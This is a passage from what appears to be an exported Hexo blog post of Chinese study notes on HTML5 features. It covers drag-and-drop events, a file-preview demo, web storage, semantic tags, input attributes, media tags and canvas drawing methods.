\"copy\";\n\t\t}\n\t\n\t\tfunction drop(ev) {\n\t\t\tev.preventDefault();\n\t\t\tvar data = ev.dataTransfer.getData(\"Text\");\n\t\t\tev.target.appendChild(document.getElementById(data));\n\t\t}\n\t</script>\n\t\n\t</body>\n\t</html>\n\n整个过程可解析为如下过程：\n\n1. **设置元素为可拖放**——draggable 属性\n\n\t\t`<img draggable=\"true\" />`\n\n2. **拖动什么** ——ondragstart 和 setData()\n<br>在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。dataTransfer.setData() 方法设置被拖数据的数据类型和值。\n\n> [参考链接](http://www.tuicool.com/articles/j6Zbam)\n\n\t\tfunction drag(ev) {\n\t\t\tev.dataTransfer.setData(\"Text\",ev.target.id);\n\t\t}\n\n\t在这个例子中，数据类型是 \"Text\"，值是可拖动元素的 id (\"drag1\")。\n\n3. **拖动过程中**——ondrag\n<br>拖动过程中，在被拖拉的节点上持续触发。\n\n4. **放到何处** ——ondragover和getData()\n<br>ondragover 事件规定在何处放置被拖动的数据。\n默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。\n这要通过调用 ondragover 事件的 event.preventDefault() 方法。\n\n\t\tevent.preventDefault()\n\n5. **进行放置** ——ondrop\n<br>当放置被拖数据时，会发生 drop 事件。在上面的例子中，ondrop 属性调用了一个函数，drop(event)。\n\n\t\tfunction drop(ev) {\n\t\t\tev.preventDefault();\n\t\t\tvar data=ev.dataTransfer.getData(\"Text\");\n\t\t\tev.target.appendChild(document.getElementById(data));\n\t\t}\n\n> 代码解释：\n\n> * 调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）\n* 通过 dataTransfer.getData(\"Text\") 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。\n* 被拖数据是被拖元素的 id (\"drag1\")\n* 把被拖元素追加到放置元素（目标元素）中\n\n其他事件和方法：\n\n* **dragend事件**：\n拖拉结束时（释放鼠标键或按下escape键）在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。它与dragStart事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，dragend事件总是会触发的。\n* **dragenter事件**：拖拉进入当前节点时，在当前节点上触发，该事件的target属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。\n* **dragover事件**：拖拉到当前节点上方时，在当前节点上持续触发，该事件的target属性是当前节点。该事件与dragenter事件基本类似，默认会重置当前的拖拉事件的效果（DataTransfer对象的dropEffect属性）为none，即不允许放下被拖拉的节点，所以如果允许在当前节点drop数据，通常会使用preventDefault方法，取消重置拖拉效果为none。\n* **event.dataTransfer.setDragImage(element,x,y)方法**：设置拖放操作的自定义图标。其中element设置自定义图标，x设置图标与鼠标在水平方向上的距离，y设置图标与鼠标在垂直方向上的距离。\n\n####H5拖拽常用功能\n\n> HTML5文件拖拽预览Demo\n\n\t<!DOCTYPE html>\n\t<html>\n\t <head> \n\t  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n\t  <title>HTML5文件拖拽预览Demo</title> \n\t  <style type=\"text/css\">\n\t  \th1 {\n\t\t\tpadding: 0px;\n\t\t\tmargin: 0px;\n\t\t}\n\t\tdiv#show {\n\t\t\tborder: 1px solid #ccc;\n\t\t\twidth: 400px;\n\t\t\theight: 300px;\n\t\t\tdisplay: -moz-box;\n\t\t\tdisplay: -webkit-box;\n\t\t\t-moz-box-align: center;\n\t\t\t-webkit-box-align: center;\n\t\t\t-moz-box-pack: center;\n\t\t\t-webkit-box-pack: center;\n\t\t\tresize: both;\n\t\t\toverflow: auto;\n\t\t}\n\t\tdiv[id^=show]:hover {\n\t\t\tborder: 1px solid #333;\n\t\t}\n\t\tdiv#main {\n\t\t\twidth: 100%;\n\t\t}\n\t\tdiv#successLabel {\n\t\t\tcolor: Red;\n\t\t}\n\t\tdiv#content {\n\t\t\tdisplay: none;\n\t\t}    \n\t</style> \n\t  <script type=\"text/javascript\">\n\t  \tfunction init() {\n\t    \tvar dest = document.getElementById(\"show\");\n\t    \tdest.addEventListener(\"dragover\",\n\t    \t\tfunction(ev) {\n\t\t\t        ev.stopPropagation();\n\t\t\t        ev.preventDefault();\n\t\t\t    },\n\t    \tfalse);\n\t\t    dest.addEventListener(\"dragend\",\n\t\t\t    function(ev) {\n\t\t\t        ev.stopPropagation();\n\t\t\t        ev.preventDefault();\n\t\t\t    },\n\t\t    false);\n\t    \tdest.addEventListener(\"drop\",\n\t\t\t    function(ev) {\n\t\t\t        ev.stopPropagation();\n\t\t\t        ev.preventDefault();\n\t\t\t        console.log(ev.dataTransfer) var file = ev.dataTransfer.files[0];\n\t\t\t        var reader = new FileReader();\n\t\t\t        if (file.type.substr(0, 5) == \"image\") {\n\t\t\t            reader.onload = function(event) {\n\t\t\t                dest.style.background = 'url(' + event.target.result + ') no-repeat center';\n\t\t\t                dest.innerHTML = \"\";\n\t\t\t            };\n\t\t\t            reader.readAsDataURL(file);\n\t\t\t        } else if (file.type.substr(0, 4) == \"text\") {\n\t\t\t            reader.readAsText(file);\n\t\t\t            reader.onload = function(f) {\n\t\t\t                dest.innerHTML = \"<pre>\" + this.result + \"</pre>\";\n\t\t\t                dest.style.background = \"white\";\n\t\t\t            }\n\t\t\t        } else {\n\t\t\t            dest.innerHTML = \"暂不支持此类文件的预览\";\n\t\t\t            dest.style.background = \"white\";\n\t\t\t        }\n\t\t\t    },\n\t   \t\tfalse);\n\t\t} \n\t\t//设置页面属性，不执行默认处理（拒绝被拖放）\n\t\t// document.ondragover = function(e) {\n\t\t//     e.preventDefault();\n\t\t// };\n\t\t// document.ondrop = function(e) {\n\t\t//     e.preventDefault();\n\t\t// }\n\t\t// window.onload = init;\n\t\n\t  </script>\n\t </head>\n\t <body> \n\t  <h1>HTML5文件拖拽预览Demo</h1> \n\t  <div id=\"show\">\n\t    文件预览区，仅限图片和txt文件 \n\t  </div>\n\t </body>\n\t</html>\n\n\n\n## Web存储\n\nHTML5 提供了两种在客户端存储数据的新方法：\n\n* localStorage - 没有时间限制的数据存储\n* sessionStorage - 针对一个 session 的数据存储\n\n之前，这些都是由 cookie 完成的。但是 cookie 不适合大量数据的存储，因为它们由每个对服务器的请求来传递，这使得 cookie 速度很慢而且效率也不高。\n\n在 HTML5 中，数据不是由每个服务器请求传递的，而是只有在请求时使用数据。它使在不影响网站性能的情况下存储大量数据成为可能。\n对于不同的网站，数据存储于不同的区域，并且一个网站只能访问其自身的数据。\nHTML5 使用 JavaScript 来存储和访问数据。\n\n#### localStorage方法\n\nlocalStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。\n\n这个例子创建并访问了 localStorage：\n\n\t<script type=\"text/javascript\">\n\t\tlocalStorage.lastname=\"Smith\";\n\t\tdocument.write(localStorage.lastname);\n\t</script>\n\n下面的例子对用户访问页面的次数进行计数：\n\n\t<script type=\"text/javascript\">\n\t\tif (localStorage.pagecount) {\n\t\t  \tlocalStorage.pagecount=Number(localStorage.pagecount) +1;\n\t\t}\n\t\telse {\n\t\t \tlocalStorage.pagecount=1;\n\t\t}\n\t\tdocument.write(\"Visits \"+ localStorage.pagecount + \" time(s).\");\n\t</script>\n\n#### sessionStorage方法\n\nsessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。\n\n创建并访问一个 sessionStorage：\n\n\t<script type=\"text/javascript\">\n\t\tsessionStorage.lastname=\"Smith\";\n\t\tdocument.write(sessionStorage.lastname);\n\t</script>\n\n应用——统计用户在当前 session 中访问页面的次数进行计数：\n\n\t<script type=\"text/javascript\">\n\t\tif (sessionStorage.pagecount) {\n\t\t  \tsessionStorage.pagecount=Number(sessionStorage.pagecount) +1;\n\t\t}\n\t\telse {\n\t\t \tsessionStorage.pagecount=1;\n\t\t}\n\t\tdocument.write(\"Visits \"+sessionStorage.pagecount+\" time(s) this session.\");\n\t</script>\n\n## H5标签\n\n### nav标签\n\n\t<nav>\n\t\t<a href=\"index.asp\">Home</a>\n\t\t<a href=\"html5_meter.asp\">Previous</a>\n\t\t<a href=\"html5_noscript.asp\">Next</a>\n\t</nav>\n\n##### 定义和用法\n\n`<nav>`定义导航链接的部分。\n\n> 如果文档中有“前后”按钮，则应该把它放到 `<nav>` 元素中。\n\n### section标签\n\n\t<section>\n\t  <h1>PRC</h1>\n\t  <p>The People's Republic of China was born in 1949...</p>\n\t</section>\n\n##### 定义和用法\n\n`<section>` 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。\n\n### header标签\n\n\t<header>\n\t\t<h1>Welcome to my homepage</h1>\n\t\t<p>My name is Donald Duck</p>\n\t</header>\n\n\t<p>The rest of my home page...</p>\n\n##### 定义和用法\n\n`<header>`定义 section 或 page 的页眉（介绍信息）。\n\n### footer标签\n\n\t<footer>\n\t  \t<p>Posted by: Ajun</p>\n\t  \t<p>Contact information: <a href=\"mailto:774271383@qq.com\">774271383@qq.com</a>.</p>\n\t</footer>\n\n##### 定义和用法\n\n`<footer>` 标签定义文档或节的页脚。\n\n页脚通常包含文档的作者、版权信息、使用条款链接、联系信息等等。\n一个文档中可以使用多个 `<footer>` 元素。\n\n> `<footer>` 元素内的联系信息应该位于 `<address>` 标签中。\n\n### output标签\n\n\t<form oninput=\"x.value=parseInt(a.value)+parseInt(b.value)\">0\n\t   \t<input type=\"range\" id=\"a\" value=\"50\">100+<input type=\"number\" id=\"b\" value=\"50\">\n\t   \t=<output name=\"x\" for=\"a b\">100</output>\n\t</form> \n\n##### 定义和用法\n\n`<output>`定义不同类型的输出，比如脚本的输出。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|for\t|element_id\t|定义输出域相关的一个或多个元素。|\n|form\t|form_id\t|定义输入字段所属的一个或多个表单。|\n|name\t|name\t|定义对象的唯一名称。（表单提交时使用）|\n\n### progress标签\n\n\t<progress value=\"22\" max=\"100\"></progress> \n\n##### 浏览器支持\n\nInternet Explorer 9 以及更早的版本不支持 `<progress>` 标签。\n\n##### 定义和用法\n\n`<progress>` 标签标示任务的进度（进程）。\n\n> 结合`<progress>`标签与 JavaScript 一同使用，来显示任务的进度。\n注意不适合用来表示度量衡（例如，磁盘空间使用情况或查询结果）。如需表示度量衡，请使用 `<meter>` 标签代替。\n\n### article标签\n\n\t<article>\n\t  \t<h1>Internet Explorer 9</h1>\n\t  \t<p>Windows Internet Explorer 9（简称 IE9）于2011年3月14日发布。</p>\n\t</article>\n\n##### 定义和用法\n\n`<article>` 标签规定独立的自包含内容。一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发。\n\n`<article>` 元素的潜在来源：\n\n* 论坛帖子\n* 报纸文章\n* 博客条目\n* 用户评论\n\n### aside标签\n\n\t<p>Me and my family visited The Epcot center this summer.</p>\n\t<aside>\n\t\t<h4>Epcot Center</h4>\n\t\tThe Epcot Center is a theme park in Disney World, Florida.\n\t</aside>\n\n##### 定义和用法\n\n`<aside>`标签定义其所处内容之外的内容。aside的内容应该与附近的内容相关。\n\n### bdi标签\n\n\t<ul>\n\t\t<li>Username <bdi>Bill</bdi>:80 points</li>\n\t\t<li>Username <bdi>Steve</bdi>: 78 points</li>\n\t</ul>\n\n##### 定义和用法\n\nbdi 指的是 bidi 隔离。\n\n`<bdi>` 标签允许您设置一段文本，使其脱离其父元素的文本方向设置。在发布用户评论或其他您无法完全控制的内容时，该标签很有用。\n\n### command标签\n\n\t<menu>\n\t\t<command onclick=\"alert('Hello World')\">Click Me!</command>\n\t</menu>\n\n##### 浏览器支持\n\n目前只有 Internet Explorer 支持 `<command>` 标签。(自己测试怎么IE也不行)\n\n##### 定义和用法\n\ncommand 元素表示用户能够调用的命令。可以定义命令按钮，比如单选按钮、复选框或按钮。\n\n只有当 command 元素位于 menu 元素内时，该元素才是可见的。否则不会显示这个元素，但是可以用它规定键盘快捷键。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|checked\t|checked\t|定义是否被选中。仅用于 radio 或 checkbox 类型。|\n|disabled\t|disabled\t|定义 command 是否可用。|\n|icon\t|url\t|定义作为 command 来显示的图像的 url。|\n|label\t|text\t|为 command 定义可见的 label。|\n|radiogroup\t|groupname\t|定义 command 所属的组名。仅在类型为 radio 时使用。|\n|type\t|checkbox<br>command<br>radio |定义该 command 的类型。默认是 \"command\"。|\n\n### datalist标签\n\n\t<input id=\"myCar\" list=\"cars\" />\n\t<datalist id=\"cars\">\n\t  <option value=\"BMW\">宝马</option>\n\t  <option value=\"Ford\">福特</option>\n\t  <option value=\"Volvo\">沃尔沃</option>\n\t</datalist>\n\n##### 定义和用法\n\n`<datalist>`标签定义下拉选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。\n\ndatalist 及其选项不会被显示出来，它仅仅是合法的输入值列表。\n\n> * 请使用 input 元素的 list 属性来绑定 datalist。\n  * 注意value属性值为选项内容，option标签内为当前选项内容的注释。\n  * 区别与select标签的区分，输入方式也有所不同。\n\n### details标签\n\n\t<details>\n\t\t<summary>Copyright 2011.</summary>\n\t\t<p>All pages and graphics on this web site are the property of W3School.</p>\n\t</details>\n\n> 与`<summary>`标签配合使用可以为details定义标题。标题是可见的，用户点击标题时，会显示出 details。若不定义summary则标题显示详细信息。\n\n##### 定义和用法\n\n定义元素的细节，用于描述文档或文档某个部分的细节。\n\n##### 浏览器支持\n\n目前只有 Chrome 支持 `<details>` 标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。\n\n##### 属性\n\nopen属性，只有一个值“open”，定义 details 内的内容默认可见。\n\n### dialog标签\n\n\t<table border=\"1\">\n\t<tr>\n\t  <th>一月 <dialog open>这是打开的对话窗口</dialog></th>\n\t  <th>二月</th>\n\t  <th>三月</th>\n\t</tr>\n\t<tr>\n\t  <td>31</td>\n\t  <td>28</td>\n\t  <td>31</td>\n\t</tr>\n\t</table>\n\n##### 定义和用法\n\n定义对话框或窗口。\n\n##### 属性\n\nopen属性，只有一个值“open”，规定 dialog 元素是活动的，用户可与之交互。\n\n##### 浏览器支持\n\n目前只有 Chrome 和 Safari 6 支持 <dialog> 标签。\n\n### embed标签\n\n\t<embed src=\"helloworld.swf\" />\n\n##### 定义和用法\n\n定义嵌入的内容，可以用来插入各种多媒体，格式可以是Swf、Midi、Wav、AIFF、AU、MP3等等。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|height\t|pixels\t|设置嵌入内容的高度。|\n|src\t|url\t|嵌入内容的 URL。|\n|type\t|type\t|定义嵌入内容的类型。|\n|width\t|pixels\t|设置嵌入内容的宽度。|\n\n### figure标签\n\n\t<figure>\n\t  <p>黄浦江上的的卢浦大桥</p>\n\t  <img src=\"shanghai_lupu_bridge.jpg\" width=\"350\" height=\"234\" />\n\t</figure>\n\n##### 定义和用法\n\n`<figure>` 标签规定独立的流内容（图像、图表、照片、代码等等）,定义媒介内容的分组，以及它们的标题。其内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。\n\n> 使用 `<figcaption>` 元素为 figure 添加标题（caption）。\n\n### input标签\n\nH5新增许多其属性，列表如下\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|accept\t|mime_type\t|规定通过文件上传来提交的文件的类型。|\n|align\t|left<br>right<br>top<br>middle<br>bottom |不赞成使用。规定图像输入的对齐方式。|\n|alt\t|text\t|定义图像输入的替代文本。|\n|autocomplete\t|on<br>off|规定是否使用输入字段的自动完成功能。|\n|autofocus\t|autofocus\t|规定输入字段在页面加载时是否获得焦点。（不适用于 type=\"hidden\"）|\n|checked\t|checked\t|规定此 input 元素首次加载时应当被选中。|\n|disabled\t|disabled\t|当 input 元素加载时禁用此元素。|\n|form\t|formname\t|规定输入字段所属的一个或多个表单。|\n|formaction\t|URL\t|覆盖表单的 action 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|formenctype\t|见注释\t|覆盖表单的 enctype 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|formmethod\t|get<br>post|覆盖表单的 method 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|formnovalidate\t|formnovalidate\t|覆盖表单的 novalidate 属性。如果使用该属性，则提交表单时不进行验证。|\n|formtarget\t|_blank<br>_self<br>_parent<br>_top<br>framename|覆盖表单的 target 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|height\t|pixels<br>%|定义 input 字段的高度。（适用于 type=\"image\"）|\n|list\t|datalist-id\t|引用包含输入字段的预定义选项的 datalist 。|\n|max\t|number<br>date|规定输入字段的最大值。请与 \"min\" 属性配合使用，来创建合法值的范围。|\n|maxlength\t|number\t|规定输入字段中的字符的最大长度。|\n|min\t|number<br>date|规定输入字段的最小值。请与 \"max\" 属性配合使用，来创建合法值的范围。|\n|multiple\t|multiple\t|如果使用该属性，则允许一个以上的值。|\n|name\t|field_name\t|定义 input 元素的名称。|\n|pattern\t|regexp_pattern\t|规定输入字段的值的模式或格式。例如 pattern=\"[0-9]\" 表示输入值必须是 0 与 9 之间的数字。|\n|placeholder\t|text\t|规定帮助用户填写输入字段的提示。|\n|readonly\t|readonly\t|规定输入字段为只读。|\n|required\t|required\t|指示输入字段的值是必需的。|\n|size\t|number_of_char\t|定义输入字段的宽度。|\n|src\t|URL\t|定义以提交按钮形式显示的图像的 URL。|\n|step\t|number\t|规定输入字的的合法数字间隔。|\n|type\t|button<br>checkbox<br>file<br>hidden<br>image<br>password<br>radio<br>reset<br>submit<br>text|规定 input 元素的类型。|\n|value\t|value\t|规定 input 元素的值。|\n|width\t|pixels<br>%|定义 input 字段的宽度。（适用于 type=\"image\"）|","slug":"HTML5新特性笔记","published":1,"date":"2017-04-04T07:08:59.195Z","updated":"2017-04-08T16:23:07.714Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s3u0005l8slwcfsr79t","content":"<h3 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h3><ul>\n<li>用于绘画的 canvas 元素</li>\n<li>用于媒介回放的 video 和 audio 元素</li>\n<li>对本地离线存储的更好的支持</li>\n<li>新的特殊内容元素，比如 article、footer、header、nav、section</li>\n<li>新的表单控件，比如 calendar、date、time、email、url、search</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"video标签\"><a href=\"#video标签\" class=\"headerlink\" title=\"video标签\"></a>video标签</h2><pre><code>&lt;video width=&quot;320&quot; height=&quot;240&quot; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot; loop=&quot;loop&quot;&gt;\n      &lt;source src=&quot;movie.ogg&quot; type=&quot;video/ogg&quot;&gt;\n      &lt;source src=&quot;movie.mp4&quot; type=&quot;video/mp4&quot;&gt;\n    Your browser does not support the video tag.\n&lt;/video&gt;\n</code></pre><ul>\n<li>width：定义播放器宽度</li>\n<li>height： 设置视频播放器的高度</li>\n<li>controls：如果出现该属性，则向用户显示控件，播放按钮，音量，进度条，下载按钮等</li>\n<li>autoplay： 如果出现该属性，则视频在就绪后马上播放。</li>\n<li>loop：如果出现该属性，则当媒介文件完成播放后再次开始播放</li>\n<li>preload：如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性</li>\n<li>src：要播放的视频的 URL，也可以像上例中写在source标签里</li>\n</ul>\n<p>video 元素允许多个 source 元素。source 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。</p>\n<p><code>&lt;video&gt;</code> 与<code>&lt;/video&gt;</code> 之间插入的内容是供不支持 video 元素的浏览器显示的：</p>\n<h4 id=\"支持格式\"><a href=\"#支持格式\" class=\"headerlink\" title=\"支持格式\"></a>支持格式</h4><table>\n<thead>\n<tr>\n<th>格式</th>\n<th>IE</th>\n<th>Firefox</th>\n<th>Opera</th>\n<th>Chrome</th>\n<th>Safari</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Ogg</td>\n<td>No</td>\n<td>3.5+</td>\n<td>10.5+</td>\n<td>5.0+</td>\n<td>No</td>\n</tr>\n<tr>\n<td>MPEG 4</td>\n<td>9.0+</td>\n<td>No</td>\n<td>No</td>\n<td>5.0+</td>\n<td>3.0+</td>\n</tr>\n<tr>\n<td>WebM</td>\n<td>No</td>\n<td>4.0+</td>\n<td>10.6+</td>\n<td>6.0+</td>\n<td>No</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Ogg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件</li>\n<li>MPEG4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件</li>\n<li>WebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件</li>\n</ul>\n<h4 id=\"方法，属性和事件\"><a href=\"#方法，属性和事件\" class=\"headerlink\" title=\"方法，属性和事件\"></a>方法，属性和事件</h4><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>属性</th>\n<th>事件</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>play()</td>\n<td>currentSrc</td>\n<td>play</td>\n</tr>\n<tr>\n<td>pause()</td>\n<td>currentTime</td>\n<td>pause</td>\n</tr>\n<tr>\n<td>load()</td>\n<td>videoWidth</td>\n<td>progress</td>\n</tr>\n<tr>\n<td>canPlayType</td>\n<td>videoHeight</td>\n<td>error</td>\n</tr>\n<tr>\n<td></td>\n<td>duration</td>\n<td>timeupdate</td>\n</tr>\n<tr>\n<td></td>\n<td>ended</td>\n<td>ended</td>\n</tr>\n<tr>\n<td></td>\n<td>error</td>\n<td>abort</td>\n</tr>\n<tr>\n<td></td>\n<td>paused</td>\n<td>empty</td>\n</tr>\n<tr>\n<td></td>\n<td>muted</td>\n<td>emptied</td>\n</tr>\n<tr>\n<td></td>\n<td>seeking</td>\n<td>waiting</td>\n</tr>\n<tr>\n<td></td>\n<td>volume</td>\n<td>loadedmetadata</td>\n</tr>\n<tr>\n<td></td>\n<td>height</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>width</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>在所有属性中，只有 videoWidth 和 videoHeight 属性是立即可用的。在视频的元数据已加载后，其他属性才可用。</p>\n</blockquote>\n<h2 id=\"audio标签\"><a href=\"#audio标签\" class=\"headerlink\" title=\"audio标签\"></a>audio标签</h2><pre><code>&lt;audio src=&quot;song.ogg&quot; controls=&quot;controls&quot;&gt;\n    Your browser does not support the audio tag.\n&lt;/audio&gt;\n</code></pre><ul>\n<li>autoplay：如果出现该属性，则音频在就绪后马上播放。</li>\n<li>controls：如果出现该属性，则向用户显示控件，比如播放按钮。</li>\n<li>loop：如果出现该属性，则每当音频结束时重新开始播放。</li>\n<li>preload：如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</li>\n<li>src：要播放的音频的 URL。</li>\n</ul>\n<p>audio 元素允许多个 source 元素。source 元素可以链接不同的音频文件。浏览器将使用第一个可识别的格式。</p>\n<p><code>&lt;audio&gt;</code> 与 <code>&lt;/audio&gt;</code> 之间插入的内容是供不支持 audio 元素的浏览器显示的。</p>\n<h4 id=\"支持格式-1\"><a href=\"#支持格式-1\" class=\"headerlink\" title=\"支持格式\"></a>支持格式</h4><table>\n<thead>\n<tr>\n<th>格式</th>\n<th>IE9</th>\n<th>Firefox3.5</th>\n<th>Opera10.5</th>\n<th>Chrome3.0</th>\n<th>Safari3.0</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Ogg Vorbis</td>\n<td></td>\n<td>YES</td>\n<td>YES</td>\n<td>YES</td>\n<td></td>\n</tr>\n<tr>\n<td>MP3</td>\n<td>YES</td>\n<td></td>\n<td></td>\n<td>YES</td>\n<td>YES</td>\n</tr>\n<tr>\n<td>Wav</td>\n<td></td>\n<td>YES</td>\n<td>YES</td>\n<td></td>\n<td>YES</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"canvas\"><a href=\"#canvas\" class=\"headerlink\" title=\"canvas\"></a>canvas</h2><pre><code>&lt;canvas id=&quot;myCanvas&quot;&gt;&lt;/canvas&gt;\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    var canvas=document.getElementById(&apos;myCanvas&apos;);\n    var ctx=canvas.getContext(&apos;2d&apos;);\n    ctx.fillStyle=&apos;#FF0000&apos;;\n    ctx.fillRect(0,0,80,100);\n&lt;/script&gt;\n</code></pre><h5 id=\"浏览器支持\"><a href=\"#浏览器支持\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>Internet Explorer 8 以及更早的版本不支持 <code>&lt;canvas&gt;</code>标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。</p>\n<h5 id=\"标签定义和用法\"><a href=\"#标签定义和用法\" class=\"headerlink\" title=\"标签定义和用法\"></a>标签定义和用法</h5><p><code>&lt;canvas&gt;</code> 标签定义图形，比如图表和其他图像。但是它只提供图形容器，必须使用javascript来绘制图形。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>height</td>\n<td>pixels</td>\n<td>设置 canvas 的高度。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>pixels</td>\n<td>设置 canvas 的宽度。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"使用javascript绘制\"><a href=\"#使用javascript绘制\" class=\"headerlink\" title=\"使用javascript绘制\"></a>使用javascript绘制</h4><p><a href=\"http://www.w3school.com.cn/tags/html_ref_canvas.asp\" target=\"_blank\" rel=\"external\">W3School参考链接</a></p>\n<h5 id=\"颜色、样式和阴影\"><a href=\"#颜色、样式和阴影\" class=\"headerlink\" title=\"颜色、样式和阴影\"></a>颜色、样式和阴影</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fillStyle</td>\n<td>设置或返回用于填充绘画的颜色、渐变或模式</td>\n</tr>\n<tr>\n<td>strokeStyle</td>\n<td>设置或返回用于笔触的颜色、渐变或模式</td>\n</tr>\n<tr>\n<td>shadowColor</td>\n<td>设置或返回用于阴影的颜色</td>\n</tr>\n<tr>\n<td>shadowBlur</td>\n<td>设置或返回用于阴影的模糊级别</td>\n</tr>\n<tr>\n<td>shadowOffsetX</td>\n<td>设置或返回阴影距形状的水平距离</td>\n</tr>\n<tr>\n<td>shadowOffsetY</td>\n<td>设置或返回阴影距形状的垂直距离</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>createLinearGradient()</td>\n<td>创建线性渐变（用在画布内容上）</td>\n</tr>\n<tr>\n<td>createPattern()</td>\n<td>在指定的方向上重复指定的元素</td>\n</tr>\n<tr>\n<td>createRadialGradient()</td>\n<td>创建放射状/环形的渐变（用在画布内容上）</td>\n</tr>\n<tr>\n<td>addColorStop()</td>\n<td>规定渐变对象中的颜色和停止位置</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"线条样式\"><a href=\"#线条样式\" class=\"headerlink\" title=\"线条样式\"></a>线条样式</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lineCap</td>\n<td>设置或返回线条的结束端点样式</td>\n</tr>\n<tr>\n<td>lineJoin</td>\n<td>设置或返回两条线相交时，所创建的拐角类型</td>\n</tr>\n<tr>\n<td>lineWidth</td>\n<td>设置或返回当前的线条宽度</td>\n</tr>\n<tr>\n<td>miterLimit</td>\n<td>设置或返回最大斜接长度</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"矩形\"><a href=\"#矩形\" class=\"headerlink\" title=\"矩形\"></a>矩形</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rect()</td>\n<td>创建矩形</td>\n</tr>\n<tr>\n<td>fillRect()</td>\n<td>绘制“被填充”的矩形</td>\n</tr>\n<tr>\n<td>strokeRect()</td>\n<td>绘制矩形（无填充）</td>\n</tr>\n<tr>\n<td>clearRect()</td>\n<td>在给定的矩形内清除指定的像素</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"路径\"><a href=\"#路径\" class=\"headerlink\" title=\"路径\"></a>路径</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fill()</td>\n<td>填充当前绘图（路径）</td>\n</tr>\n<tr>\n<td>stroke()</td>\n<td>绘制已定义的路径</td>\n</tr>\n<tr>\n<td>beginPath()</td>\n<td>起始一条路径，或重置当前路径</td>\n</tr>\n<tr>\n<td>moveTo()</td>\n<td>把路径移动到画布中的指定点，不创建线条</td>\n</tr>\n<tr>\n<td>closePath()</td>\n<td>创建从当前点回到起始点的路径</td>\n</tr>\n<tr>\n<td>lineTo()</td>\n<td>添加一个新点，然后在画布中创建从该点到最后指定点的线条</td>\n</tr>\n<tr>\n<td>clip()</td>\n<td>从原始画布剪切任意形状和尺寸的区域</td>\n</tr>\n<tr>\n<td>quadraticCurveTo()</td>\n<td>创建二次贝塞尔曲线</td>\n</tr>\n<tr>\n<td>bezierCurveTo()</td>\n<td>创建三次方贝塞尔曲线</td>\n</tr>\n<tr>\n<td>arc()</td>\n<td>创建弧/曲线（用于创建圆形或部分圆）</td>\n</tr>\n<tr>\n<td>arcTo()</td>\n<td>创建两切线之间的弧/曲线</td>\n</tr>\n<tr>\n<td>isPointInPath()</td>\n<td>如果指定的点位于当前路径中，则返回 true，否则返回 